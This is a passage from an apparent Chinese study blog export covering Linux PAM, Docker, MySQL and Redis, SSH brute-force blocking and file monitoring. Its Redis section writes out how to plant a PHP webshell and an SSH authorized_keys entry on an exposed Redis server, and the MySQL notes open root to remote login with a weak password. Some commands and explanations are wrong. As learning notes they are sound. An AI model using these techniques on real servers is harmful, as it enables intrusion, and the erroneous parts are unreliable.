（可选条件）  结果不影响\n\nInclude                 包含另外一个配置条件相同的行\n\nSubstack                垂直叠加\n```\n\n- PAM 常用模块\n\n  - pam_rootok.so     /etc/pam.d/su\n\n    示例 限制root 切换到其他用户也需要密码\n\n    ```shell\n    [root@192 ~]# cat /etc/pam.d/su\n    #%PAM-1.0\n    auth            sufficient      pam_rootok.so   \n    这一行注释了就代表从root 切换到其他用户也需要密码\n    [root@192 ~]# cat /etc/pam.d/su\n    #%PAM-1.0\n    auth            sufficient      pam_rootok.so\n    ```\n\n  - pam.access.so\n\n    ```shell\n    访问控制，配置文件 \n    \n    修改 /etc/pam.d/sshd\n    \n    新增\n    \n    Auth   required  pam.access.so\n    \n    修改 /etc/security/access.conf\n    \n    # 例如 限制用户从哪些网段登录\n    \n    # -代表deny 后面跟用户 +地址\n    \n    -:root:192.168.2.30 \n    +:root:192.168.2.0/24 EXCEPT 192.168.2.1\n    \n    \n    ```\n\n  \n  - pam_time.so\n  \n    ```shell\n    基于时间的访问控制，默认配置文件在  /etc/security/time.conf\n    \n    grep time /etc/pam.d/sshd\n    \n    account required  pam_time.so  # 新增的内容\n    \n    # 修改  /etc/security/time.conf 实现基于时间的控制\n    \n    ```\n  \n  - pam_tally2.so\n  \n    功能：登录统计\n  \n    ```\n    grep tally /etc/pam.d/sshd\n    auth required pam_tally2.so deny=3 even_deny_root root_unlock_time=60 unlock_time=60\n    # 查看被锁了多少次\n    pam_tally2 -u\n    # 清空计数\n    pam_tally2 --reset -u root\n    \n    ```\n  \n  - pam 资源限制\n  \n    对用户进行系统资源使用限制\n  \n    pam_limits.so\n  \n    功能：限制用户会话过程中对各种资源的使用情况\n  \n    /etc/security/limits.conf\n  \n    /etc/security/limits.d/*.conf\n    \n    ```\n    # domain  type  item  value\n    jack soft nofile   10240        # 设置jack 用户最大打开文件数10240个\n    ```\n  \n  -  Cgroup 对资源进行限制\n  \n    ```shell\n    yum -y install libcgroup\n    systemctl enable cgconfig\n    systemctl start cgconfig\n    man cgconfig.conf\n    \n    vim /etc/cgconfig.conf\n    group  lesscpu {\n           cpu{\n           cpu.shares=200(ms);\n           }\n    }\n    group  morecpu {\n           cpu{\n           cpu.shares=800(ms);\n           }\n    }\n    cgexec -g cpu:lesscpu sha1sum /dev/zero\n    cgexec -g cpu:morecpu md5sum /dev/zero\n    \n    可以看到以上两个进程的CPU 占比大概是1：4 的样子\n    \n    ```\n  \n    \n  \n    ```\n    \n    ```\n  \n    \n","tags":["系统基础"],"categories":["系统基础"]},{"title":"Docker 基本操作学习","url":"/2023/04/24/Web渗透/Docker_new/","content":"\n\n### Docker--常用操作命令\n\n1、对比虚拟机\n\n- 安装虚拟机软件，安装操作系统，备份虚拟机文件，随时复制并启动\n\n- 在Linux 安装Docker应用程序，从镜像仓库拉取操作系统或者应用环境，基于该镜像文件创建一个容器（运行环境），备份容器以供下次使用，或者将容器提交为本地镜像\n\n- 虚拟机模拟一套全新的硬件环境，而Docker 则是直接使用宿主机资源\n\n  \n\n2、安装\n\n```shell\nyum install net-tools\nyum install -y yum-utils device-mapper-persistent-data lvm2\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\nyum makecache fast\nyum -y install docker-ce\nsystemctl start docker\ndocker info\nsystemctl list-unit-files\nsystemctl list-unit-files |grep docker\n```\n\n2、docker命令\n\n```shell\ndocker ps             # 查看当前运行的容器\ndocker images          # 列举当前的镜像\ndocker search centos   # 查找镜像\ndocker pull hello-world  # 拉取镜像\ndocker create hello-world  # 创建容器\n\n[root@192 ~]# docker create --name your_docker_name hello-world\n56ca1631d20a8e016f47545e0d0d65c253709629000ade70571c34bc54cfc2c8\n\ndocker container ls -a # 查看所有的容器\n\n[root@192 ~]# docker container ls -a\nCONTAINER ID   IMAGE         COMMAND    CREATED          STATUS    PORTS     NAMES\n56ca1631d20a   hello-world   \"/hello\"   44 seconds ago   Created             vibrant_kalam\ndocker run --name your_docker_name hello-world  # 创建并启动容器\n\n```\n\n![image-20230424215554888](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230424215554888.png)\n\n相关网址：\n\nhttps://hub.daocloud.io/","tags":["web渗透"],"categories":["web渗透"]},{"title":"数据库学习","url":"/2023/04/24/系统基础/数据库学习_new/","content":"\n\n### 1、分类\n\n- 非关系数据库：Memcached/Redis 缓存服务器，将数据保存到内存中以提高访问效率\n\n- 关系数据库：Mysql\n\n### 2、MYSQL数据库常用操作\n\n- 增删查改\n\n\n```shell\ncreate database school character set 'utf8mb4';  #创建数据库\ncreate table student (id int,sid varchar(15),sname varchar(15),sphone char(11),ssec char(1),sage tinyint,create_time datetime);  # 创建表\nshow columns from student;                   # 查看表的结构\ndesc student;                                # 查看表的结构\nINSERT INTO student(sid,name,phone,sex,age,degree,college.createtime) values (xx)  # 插入数据\n# 插入多条数据以;结尾\n# 删除数据-清空\nTRUNCATE TABLE student;\nDELETE FROM student;\nDELETE FROM student where sid=''; # 删除特定数据，通过where 指定条件\n\n# 更新数据\nUPDATE student SET sname='xxx'; # 也可以加where 条件\n\n```\n\n- Navicat 始终无法连接\n\n解决办法\n\n- ```\n  # 放行3306 ，最大可能就是这个原因\n  firewall-cmd --permanent --zone=public --add-port=3306/tcp\n  firewall-cmd --reload\n  ```\n\n- ```\n  # 给权限允许外部连接\n  GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;\n  FLUSH privileges;\n  ```\n\n- ```shell\n  # 设置密码，允许连接\n  update user set host='%' where user='root';\n  set password =password('123456');\n  ```\n\n- \n  约束\n\n  - 主键约束   \n\n  - 外键结束\n\n  - 唯一约束  \n\n\n- 查询语句\n\n```powershell\n# 利用子查询\nSELECT * FROM student WHERE age=(SELECT MAX(age) FROM student));\n# like模糊查询 %代替任意多个字符 _代替一个字符\nSELECT * FROM WHERE sname like '李%'\n# 统计某个列的总和、平均数\nSELECt SUM(age) From student;\nSELECt AVG(age) From student;\n# 查询C10课程排名前5的学生\nSELECT * FROM grade where courseid='c10' order by score DESC limit 5;\n# 保存并列\nSELECT * FROM grade where courseid='c10' and grade in (SELECT grade FROM grade where courseid='c10' order by DESC limit 5);\n\n\n# 分组查询  GROUP BY  自动去重 \nSELECT coursed,AVG(score) FROM grade GROUP BY courseid;\n# 如果要对GROUP BY 以后的聚合函数运算出来的结果进行过滤，使用HAVING, WHERE 必须在GROUP by 之前\nSELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid HAVING AvgScore >70';对的\nSELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid WHERE AvgScore >70';错误\nSELECT coursed,AVG(score) AS AvgScore FROM grade WHERE AvgScore >70' GROUP BY courseid :错误\n# 子查询的 语句  ANY  ALL  \nSELECT age FROM student WHERE age <ANY(SELECT DISTINCT(age) From student WHERE degree='xxx')\n# UNION 两条SQL语句的查询结果拼成一个结果集 SELECT xxx 用于一些灵活的东西 \nSELCT classid.calssname FROM class UNION SELECT 'S04','网安3班'\n\n# 多表查询\nSELECT * FROM student ,class where student.studentid = grade.studentid;\nSELECT * FROM student JOIN class ON  student.studentid = grade.studentid;\nSELECT * FROM student INNER JOIN class ON  student.studentid = grade.studentid;\n\n# left join on 和right join on\n# 视图 可以把一个很复杂的SQL语句创建为视图，从而将查询结果永久的保存在一张类似表的结构中去，并且支持SQL查询\n\n# 索引\n# 用于帮助提升数据库查询性能，避免全表扫描导致速度极慢\n# 如何判断索引是否成功\nEXPLAIN SELECT * from customer where phone='xxx'\n# 利用sql语句写到文件\nSELECT “xxx ” INTO OUTFILE '/tmp/xxx'\n\n# 数据库备份\nmysqldump -h127.0.0.1 -ppassword xxx >xx.sql\n# 还原数据库\nmysqldump -h127.0.0.1 -ppassword xxx <xx.sql\n\n```\n\n- 主从复制\n\n\n两台机器进行数据的实时同步。Master,Slave 所有数据以Master为准，Slave 进行实时复制同步==》实时备份，读写分离，写数据到Master,读从Salve。\n\n### 3、Redis 数据库\n\n使用最为广泛的缓存服务器，数据保存在内存中，所有的IO操作在内存中，速度非常快，性能非常高。\n\n断电数据消失。\n\n\n\n- 安装与使用\n\n```shell\n# 下载链接 https://redis.io/download/\ntar xzvf redis-7.0.11.tar.gz\ncd redis-7.0.11/ && make && make install\nredis-server ./redis.conf \n\n[root@192 redis-7.0.11]# redis-cli\n127.0.0.1:6379> set name zwj\nOK\n127.0.0.1:6379> get name\n\"zwj\"\n# 设置过期时间\n127.0.0.1:6379> expire name 10\n(integer) 1\n127.0.0.1:6379> exists name\n(integer) 1\n127.0.0.1:6379> ttl name\n(integer) 2\n127.0.0.1:6379> ttl name\n(integer) -2\n127.0.0.1:6379> exists name\n(integer) 0\n\n127.0.0.1:6379> ttl name\n(integer) -1\n127.0.0.1:6379> expire name 10\n(integer) 1\n127.0.0.1:6379> ttl name\n(integer) 8\n127.0.0.1:6379> PERSIST name\n(integer) 1\n127.0.0.1:6379> ttl name\n(integer) -1\n\n# 按照列进行设置，可用于表格类型的存储  （hash类型数据）\n127.0.0.1:6379> hset user_1 name zwj\n(integer) 1\n127.0.0.1:6379> hset user_1 address chengdu\n(integer) 1\n127.0.0.1:6379> hset user_1 age 19\n(integer) 1\n127.0.0.1:6379> HGET user_1 name\n\"zwj\"\n127.0.0.1:6379> \n# 列表类型的数据\n127.0.0.1:6379> lpush name_list lisi\n(integer) 2\n127.0.0.1:6379> lpush name_list wangwu\n(integer) 3\n127.0.0.1:6379> keys name_list\n1) \"name_list\"\n127.0.0.1:6379> lrange name_list 0 -1\n1) \"wangwu\"\n2) \"lisi\"\n3) \"zhangsan\"\n127.0.0.1:6379> LINDEX name_list 0\n\"wangwu\"\n# 集合类型的数据 （不允许重复） 默认会去重处理 sadd 添加的不排序，zadd 添加的会按照score排序\nsadd key value\n127.0.0.1:6379> sadd set qwer qwer\n(integer) 1            (新增一个)\n127.0.0.1:6379> sadd set qwer 12345\n(integer) 1            （只新增一个）\n127.0.0.1:6379> sadd set 22 33 44 \n(integer) 3            （新增3个）\n127.0.0.1:6379> scard set\n(integer) 5\n127.0.0.1:6379> smembers set\n1) \"33\"\n2) \"22\"\n3) \"12345\"\n4) \"qwer\"\n5) \"44\"\n\n# 清空数据库\nflushdb   # 清空当前  flush 默认16个数据库\nflushall  # 清空所有\n```\n\n- 配置远程连接\n\n```shell\nvim redis.config\n\n注释 bind 127.0.0.1 -::1\n\n取消注释 requiredpass 123456\nfirewalld\n```\n\n- 开放6379 端口\n\n```shell\n[root@192 ~]# firewall-cmd --list-all\npublic (active)\n  target: default\n  icmp-block-inversion: no\n  interfaces: ens33\n  sources: \n  services: dhcpv6-client ssh\n  ports: 3306/tcp\n  protocols: \n  masquerade: no\n  forward-ports: \n  source-ports: \n  icmp-blocks: \n  rich rules: \n\n[root@192 ~]# firewall-cmd --add-port=6379/tcp --permanent \nsuccess\n[root@192 ~]# firewall-cmd --reload\nsuccess\n[root@192 ~]# firewall-cmd --list-all\npublic (active)\n  target: default\n  icmp-block-inversion: no\n  interfaces: ens33\n  sources: \n  services: dhcpv6-client ssh\n  ports: 3306/tcp 6379/tcp\n  protocols: \n  masquerade: no\n  forward-ports: \n  source-ports: \n  icmp-blocks: \n  rich rules: \n```\n\n- 配置后台运行\n\n```shell\nvim redis.conf\n更改 daemonize yes\n```\n\n- redis 持久化\n\n  - rdb 保存\n\n    默认情况下保存在dump.rdb文件中\n\n    更改策略如下：\n\n  ```\n  #   * After 3600 seconds (an hour) if at least 1 change was performed\n  #   * After 300 seconds (5 minutes) if at least 100 changes were performed\n  #   * After 60 seconds if at least 10000 changes were performed\n  #\n  # You can set these explicitly by uncommenting the following line.\n  #\n  # save 3600 1 300 100 60 10000\n  save 60 2    # 一分钟内有两个key发生了变化就备份\n  ```\n\n  - AOF保存\n\n    ```\n    always   每次写入都同步\n    \n    everysec  每秒一次\n    \n    no   系统控制\n    \n    修改 redis.conf\n    \n    appendonly no  更改为yes  默认关闭\n    \n    修改同步策略 默认每秒\n    \n    # appendfsync always\n    appendfsync everysec\n    # appendfsync no\n    ```\n\n  - 主从复制\n\n    配置master和slave\n\n    两台电脑分别配置后台运行，可远程登录，需要密码，日志路径，然后在slave 机器上 masterauth pass\n\n    ```\n    daeminize yes\n    masterauth 123456\n    requirepass 123456\n    logfile redis.log\n    注释掉  bind 127.0.0.1 -：：1\n    ```\n\n    接着在slave 机器上运行slaveeof masterip masterport ，最后用info replication 查看配置情况\n\n  - 安全漏洞相关\n\n    - redis写入webshell\n\n      ~~~shell\n      config set dir /var/www/html\n      config set dbfilename zcc.php\n      set xxx \"\\n\\n\\n<?php @eal($_POST['zcc']);?>\\n\\n\"\n      save\n      \n      \n      攻击者可以通过向受攻击的服务器发送恶意 HTTP POST 请求来利用这段代码。具体步骤如下：\n      \n      1. 获取 Redis 服务器的 IP 地址和端口号。\n      2. 发送一个类似于以下内容的 HTTP POST 请求到服务器：\n      ```\n      POST / HTTP/1.1\n      Host: <Redis 服务器 IP 地址>:<Redis 服务器端口号>\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: <Payload 长度>\n      \n      zcc=<?php phpinfo();?>\n      ```\n      上述请求会将一段 PHP 代码 `<?php phpinfo();?>` 发送给 Redis 数据库，并将其存储到之前设置的名为 \"xxx\" 的键中。\n      \n      3. 在发送完请求后，攻击者可以访问之前指定的目录 `/var/www/html`，并执行 `zcc.php` 文件。该文件中包含了攻击者注入的 PHP 代码，因此会执行 `phpinfo()` 函数并显示当前 PHP 环境的信息。\n      \n      ~~~\n\n    - redis 写入ssh公钥登录\n\n      ```shell\n      ssh-keygen -t rsa \n      config set dir /root/.ssh\n      config set dbfilename authorized_keys\n      set x \"\\n\\n\\n 公钥 \\n\\n\\n\"\n      save\n      ```\n\n      \n\n### 4、Oracle\n\n关系型数据库，企业型数据库，比较复杂，主要掌握和Mysql 数据库的区别，大同小异\n\n- Oracle 的数据库结构   oracle服务->表空间->多个表->各个表结构\n\n- Oracle 的用户\n\n- Oracle 的日期格式，to_date(\"日期\"，‘YYYY-MM-DD HH24:Mi:SS') 转换，输出的时候用to_char(date,‘YYYY-MM-DD HH24:Mi:SS')\n\n- Group By 使用时，聚合函数不能与无关的列放在一起select\n\n- 没有Limit 关键词，要用rownum,虚拟列 如取前10  rownum<=10;\n\n- 没有自增列，要创建序列\n\n  ```mysql\n  select MYSEQ.nextval from dual;\n  insert into demo(id,name) values(MYSEQ.nextval,'zhangsan'); \n  ```\n\n- 备份命令 exp /imp\n\n","tags":["系统基础"],"categories":["系统基础"]},{"title":"屏蔽SSH远程暴力登录","url":"/2023/04/20/应急响应/屏蔽SSH远程暴力登录/","content":"\n#### 1、背景\n\n通过SSH远程登录失败多次，通过防火墙将其屏蔽，并发送通知\n\n#### 2、分析问题-解决过程\n\n如何判断SSH远程登录失败\n\n通过查看/var/log/secure 查看，如下即为登录失败的情况，如果多次出现，则可以判定为非法登录\n\n```\nApr 20 22:16:40 192 sshd[5101]: Failed password for root from 192.168.101.15 port 50632 ssh2\n\n```\n\n```shell\nfailedcount=$(cat /var/log/secure |grep \"Failed password\"|wc -l)\nif [ $failedcount -gt 2 ]; then\n   echo \"too many count\"\n   ip=$(cat /var/log/secure |grep \"Failed\" |awk '{print $11}' |uniq)\n   status_fire=$(firewall-cmd --state)\n   if [ $status_fire != \"running\" ]; then\n      systemctl start firewalld\n   fi\n   firewall-cmd --add-rich-rule='rule family=ipv4 source address=\"$ip\" drop'\n   echo \"$ip 被防火墙阻止\"\n   \nfi\n```\n\npkill 可根据进程名kill 掉进程\n\nwho 可以看到哪些人登录了\n\n![image-20230420224036355](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230420224036355.png)\n\n```\n\n# 实现功能，防火墙禁止访问以及关闭已经连接的session \n\nfailedcount=$(cat /var/log/secure |grep \"Failed password\"|wc -l)\nif [ $failedcount -gt 2 ]; then\n   echo \"too many count\"\n   status_fire=$(firewall-cmd --state)\n   if [ $status_fire != \"running\" ]; then\n      systemctl start firewalld\n   fi\n   ip='ip.txt'\n   cat /var/log/secure |grep \"Failed\" |awk '{print $11}' |uniq >$ip\n   while read line;do\n       firewall-cmd --add-rich-rule='rule family=ipv4 source address=\"$line\" drop'\n       if [ $? -eq 0 ]; then\n          echo \"$line 被防火墙阻止\"\n       else\n         echo \"$line 未能被防火墙阻止\" >alert.log\n         mail -s '重要警告' 2194620553@qq.com <alert.log\n       fi\n       # kill 已经连接的session\n       who|grep $line|awk 'print $2'>tty.log\n       while read xxx;do\n          pkill -kill -t $xxx\n       done < tty.log\n       # who |grep $ip |while read line; do term=$(echo $line|awk '{print $2}');pkill -kill -t $term ; done       \n   done < $ip\n   # 替换掉已经操作的，防止重复操作\n   sed -i 's/Failed password/Failedxxpassword/g' /var/log/secure\n      \nfi\n```\n\n","tags":["应急响应"],"categories":["应急响应"]},{"title":"Linux 文件监控小脚本","url":"/2023/04/18/系统基础/Linux 文件监控_new/","content":"\n\n### Linux文件监控小脚本\n\n1、通过md5sum 对比\n\n```shell\n# 计算root目录下所有文件的md5 并重定向到origin_md5\nfind /root/* --type f |xargs md5sum > origin_md5\n# 检查文件有没有被修改，导致md5变化\nmdsum -c orign_md5\n```\n\n![image-20230418221659638](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230418221659638.png)\n\n![image-20230418221719095](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230418221719095.png)\n\n2、通过diff 命令比较内容的修改，目录里面文件的新增也可以检测到\n\n修改了xxx\n\n./origin/anaconda-ks.cfg: OK\n./origin/monitor.sh: OK\n./origin/test.txt: OK\n./origin/xxx: FAILED\nmd5sum: WARNING: 1 computed checksum did NOT match\n\n删除了xxx\n\n./origin/anaconda-ks.cfg: OK\n./origin/monitor.sh: OK\n./origin/test.txt: OK\nmd5sum: ./origin/xxx: No such file or directory\n./origin/xxx: FAILED open or read\nmd5sum: WARNING: 1 listed file could not be read\n\n新增\n\n[root@192 ~]# diff origin after\nOnly in origin: xxx1\n\n\n\n```shell\nmd5_log='./origin_md5'\nif [ $# -eq 2 ]; then\n   origin=$1\n   after=$2\nelif [ $# -eq 3 ]; then\n   origin=$1\n   after=$2\n   new=$3\n   if [ $new = \"new\" ]; then\n      mkdir $after\n      cp $origin/* $after\n      find $origin -type f |xargs md5sum |tee $md5_log\n      exit 0\n   fi\nelse\n   echo \"参数错误\"\n   exit 1\nfi\n\n# 文件新增\ndiff_result=$(diff $origin $after|grep ^Only |sed -e 's/Only in//g' -e 's/: /\\//g')\nif [ $? -eq 0 ]; then\n   echo -e '**文件变化情况**\\n'\"$diff_result\" | tee result.log\n   mail -s \"text\" \"2194620553@qq.com\"< result.log\nfi\n\n# 文件内容修改\ncontent_diff=$(md5sum -c $md5_log 2>/dev/null |grep \"FAILED$\"|sed -e 's/FAILED//g')\nif [ $? -eq 0 ]; then\n   echo -e \"***被修改的文件情况***\\n\"\"$content_diff\" | tee md5_result\n   mail -s \"text\" \"2194620553@qq.com\" <md5_result\nfi\n\n# 文件被删除\ndel_diff=$(md5sum -c $md5_log 2>/dev/null |grep \"FAILED open or read\"|sed -e 's/FAILED open or read//g')\nif [ $? -eq 0 ]; then\n   echo -e \"***被删除的文件情况***\\n\"\"$del_diff\" | tee del_log\n   mail  -s \"test\" \"2194620553@qq.com\" <del_log\nfi\n```\n\n![image-20230420215118633](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230420215118633.png)\n\n","tags":["系统基础"],"categories":["系统基础"]},{"title":"Linux基础","url":"/2023/04/06/系统基础/Linux基础_new/","content":"\n​            \n\n\n### Linux 基础\n\n1、Centos 7 软件安装\n\n- rpm 安装\n  - rpm -ivh 软件包\n  - rpm -e 软件包\n  - rpm -qa |grep 软件包\n\n- 源码安装\n\n  - 寻找configure setup.sh install.sh \n\n    - ./configure\n    - make \n    - make install\n\n    发现缺少依赖，但是系统已经安装对应的软件，可以尝试安装一下-devel,如pcre-devel\n\n- yum 安装\n  - yum list\n  - yum install\n  - yum repolist  列出当前的源\n  - yum deplist  查看依赖库\n  - yum erase 软件包\n\n2、相关命令\n\nnet-tools 以及iproute2 两套网络相关命令体系\n\n- ip addr add 192.168.101.111/24 dev ens33\n\n  ifconfig ens33 192.168.101.111\n\n  临时增加一个IP地址，一个网卡可以绑定多个IP地址\n\n- ss -anl\n\n  netstat -anlop  列出当前端口占用情况\n\n- traceroute 跟踪路由\n\n- curl -O  url   \n- wget -O xxx URL \n\n- tcpdump\n\n  - tcpdump tcp and dst port 80 -i ens33 -w xx.pcap\n\n\n3、Linux 命令\n\n- tee  命令同时打印到控制台以及文件中\n\n  ![image-20230408212824118](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230408212824118.png)\n\n- 1>file  2>file \n\n  1 代表正确的重定向，2代表错误的重定向\n\n  ![image-20230408213006439](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230408213006439.png)\n\n- 关于参数的判断语句\n\n  ```shell\n  if [ \"$#\" -ne 1 ]; then\n  echo \"参数错误，输入过多 或者未输入参数\"\n  exit 1\n  fi\n  \n  if [ -e \"$filename\" ]; then \n  grep -n \"root\" $filename\n  else\n  echo \"文件不存在\"\n  exit 1\n  fi\n  ```\n\n  注意[] 前后的空格 $ 必须加引号\n\n  关于判断文件以及目录的参数\n\n  ```shell\n  -e filename     如果 filename 存在，则为真            [ -e /var/log/syslog ]\n  -d filename     如果 filename 为目录，则为真          [ -d /tmp/mydir ]\n  \n  -f filename     如果 filename 为常规文件，则为真      [ -f /usr/bin/grep ]\n  \n  -L filename     如果 filename 为符号链接，则为真      [ -L /usr/bin/grep ]\n  \n  -r filename     如果 filename 可读，则为真            [ -r /var/log/syslog ]\n  \n  -w filename     如果 filename 可写，则为真            [ -w /var/mytmp.txt ]\n  \n  -x filename     如果 filename 可执行，则为真          [ -L /usr/bin/grep ]\n  \n  -s filename     如果 filename 长度不为零，则为真          [ -s /usr/bin/grep ]\n  ```\n\n- 引号\n\n  \n\n  - 双引号 变量会被引用\n\n  - 单引号，变量不会被引用\n\n  - 反引号，把里面的内容当作一个命令\n\n    ```shell\n    # 引号相关\n    \n    echo \"环境变量的路径： $PATH\"\n    echo '环境变量的路径： $PATH'\n    echo `date \"+%Y-%M-%D\"`\n    #output \n    环境变量的路径： /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin\n    环境变量的路径： $PATH\n    2023-10-04/08/23\n    ```\n\n- $? 非零代表上一条命令失败\n\n- $0 代表脚本的名称，$1 是第一个参数\n\n- $@ 和$* 返回脚本的参数，前者是多个字符串，或者是一个字符串\n\n- expr 数字命令  必须有空格，不能处理小数\n\n  ```shell\n  [root@192 ~]# expr 10+20\n  10+20\n  [root@192 ~]# expr 10 + 20\n  30expr 10 + 10\n  ```\n\n- 逻辑运算\n\n  - a  与\n\n  - -o 或\n\n  - !  非\n\n- 字符串\n\n  - -z  为空字符串\n\n  - -n 为非空字符串\n\n    ```shell\n    [root@192 ~]# [ -z $xxx ]\n    [root@192 ~]# echo $?\n    1\n    [root@192 ~]# [ -n $xxx ]\n    [root@192 ~]# echo $?\n    0\n    [root@192 ~]# echo $xxx\n    12345\n    ```\n\n- 数值比较\n\n  - ```shell\n    -eq   数值相等\n    \n    -ne  数值不等\n    \n    -le  小于等于\n    \n    -ge 大于等于\n    \n    -gt 大于\n    \n    -lt 小于\n    ```\n\n- 循环语句\n\n  ```shell\n  - #!/usr/bin/bash\n    # for \n    sum=0\n    for i in {1..100}; do\n       #sum=`expr $sum + $i`\n       #let sum=sum+i\n       ((sum=sum+i))\n    done\n    echo \"$sum\"\n    while []; do\n    \txxxx\n    done\n   \n  # 后面那个1是步长,双圆括号用在这很好\n  #for i in {1..100..1}; do\n  for ((i=0;i<=100;i++)); do\n     let sum+=i\n  done \n  echo \"sum is $sum\"\n   \n  # while\n  #!/usr/bin/bash\n  i=0\n  sum=0\n  while [ $i -lt 10 ]; do\n      let sum=sum+i\n      let i++\n  done\n  echo \"$sum\"\n  ```\n\n- 函数\n\n  ```shell\n  - function add(){\n    let sum=$1+$2 # 参数取值方式\n    echo \"$sum\"  # 相当于返回值\n    }\n    #result=$(add 100 200)\n    result=`add 100 200`  #两种赋值方式\n    echo $result\n  \n  ```\n\n  关于括号的一些用法\n\n  - (()) 双圆括号，用于运算，可以替代expr，数学运算\n  \n    ```shell\n    line=1\n    ((line+=3))\n    echo $line  # 4\n    ```\n  \n    \n  \n  - ${} 可以去特定参数或变量的值 ${1}\n  \n  - $() 可以代替反引号执行圆括号中的命令\n  \n  - $[] 用于整数运算，也可以代替expr\n\n​\t\t示例 用了阶乘\n\n```shell\nfunction jiecheng(){\n   sum=1\n   for ((i=1;i<=$1;i++)); do\n       let sum=sum*$i\n       #echo $sum \n   done\n   echo $sum\n}\nif [ $# != 1 ];then\n   echo \"usage jiecheng number\"\n   exit 1\nfi\nresult=$(jiecheng $1)\necho $result\n```\n\n- 数组的操作\n\n  ```shell\n  declare -a weekday\n  # 数组下标默认从1开始\n  # 单个赋值\n  weekday[1]=Monday\n  weekday[2]=Tuesday\n  weekday[3]=xxx\n  #整体赋值\n  weekday={Monday Tuesday xxx}\n  #全部输出\n  echo ${weekday[@]}\n  #按照下标输出\n  echo ${weekday[1]}\n  #单个输出\n  for day in ${weekday[@]};do\n      echo $day\n  done\n  # 修改\n  weekday[1]=qwer\n  echo ${weekday[1]}\n  # 取数组个数\n  echo \"数组的个数是 ${#weekday[@]}\"\n  \n  \n  #\n  len=${#weekday[@]}\n  echo $len\n  for ((i=1;i<=$len;i++)); do\n      echo \"${weekday[$i]}\"\n  done\n  ```\n\n\n- 字符串处理\n\n  1、删除字符\n\n  - #*// 从左边开始删除第一个// 及其左边的内容\n  - ##*/ 从左边开始，删除最后一个/ 及其左边的内容\n  - %/*  从右边开始，删除第一个/ 及其右边的内容\n  - %%/* 从右边开始，删除最后一个/及其右边的内容\n  - ![](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230412214344410.png)\n\n​\t\t\t![image-20230412214344410](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230412214344410.png\n\n- ​\t取字符\n\n  - ${str:start:substrlen}\n\n    ```shell\n    phone=\"13109097878\"\n    echo ${phone:0:5} # 表示从第一个开始取5个字符串\n    echo ${phone:2:5} # 表示从第3个开始取5个字符串\n    echo ${phone:0-5:3} # 表示从倒数第五个开始取3个字符\n    echo ${#phone} # 取字符串的长度\n    \n    ```\n\n  - awk 的使用\n\n    ```\n    awk 选项 处理逻辑 文件\n    echo \"Hello Woniuxy Welcome Chengdu\" |awk '{print $2}' # 默认按照空格隔开后的第二列的内容\n    Woniuxy\n    \n    echo -e \"Hello Woniuxy Welcome Chengdu\\nA B C D\" |awk '{print $2}' #\\n 就分成了两行，然后会输出每一行的第二列的内容\n    Woniuxy\n    B\n    \n    echo 'http://www.woniuxy.com//index.html' |awk -F '.' '{print $2}'   #用. 作为分隔符\n    \n    echo 'http://www.woniuxy.com//index.html' |awk -F '[/.]' '{print $2}'   #用/. 两个都作为分隔符\n    \n    ping www.baidu.com -c 2   |awk -F [\\(\\)] '{print $2}'  # 输出以() 分割的第二列的内容，可以获取IP地址\n    PING www.baidu.com (39.156.66.18) 56(84) bytes of data.\n    64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq=1 ttl=51 time=39.9 ms\n    64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq=2 ttl=51 time=39.4 ms\n    \n    awk -F : '$1，~/正则表达式/ {print $1}' /etc/passwd   # 输出第一列包含root的以:分割的第一列的内容，~/正则表达式/\n    \n    ```\n\n  \n  - sed 的使用\n  \n    - -i  永久修改文件   后续的都是直接显示，但是不会写入到文件\n  \n    - -n 显示处理后的结果\n  \n      ```shell\n      # 显示处理后的结果，/root/p 搜索并打印含有root的行，如果改成d 就是搜索并删除含有root的行\n      [root@192 ~]# sed -n  '/root/p' test.txt   \n      root:x:0:0:root:/root:/bin/bash\n      operator:x:11:0:operator:/root:/sbin/nologin\n      ```\n  \n      \n  \n    - a 新增  在后面新增新行\n  \n      ```\n      [root@192 ~]# sed '5a hello world' test.txt   #在第五行后面新增数据\n      root:x:0:0:root:/root:/bin/bash\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      hello world\n      sync:x:5:0:sync:/sbin:/bin/sync\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/root:/sbin/nologin\n      \n      ```\n  \n    - d 删除\n  \n      ```\n      [root@192 ~]# sed '6d' test.txt   #删除第六行\n      root:x:0:0:root:/root:/bin/bash\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/root:/sbin/nologin\n      ```\n  \n    - i 插入，在前面插入 新行\n  \n      ```\n      [root@192 ~]# sed '5i hellword' test.txt   # 在第五行前面新增一行数据helloword\n      root:x:0:0:root:/root:/bin/bash\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      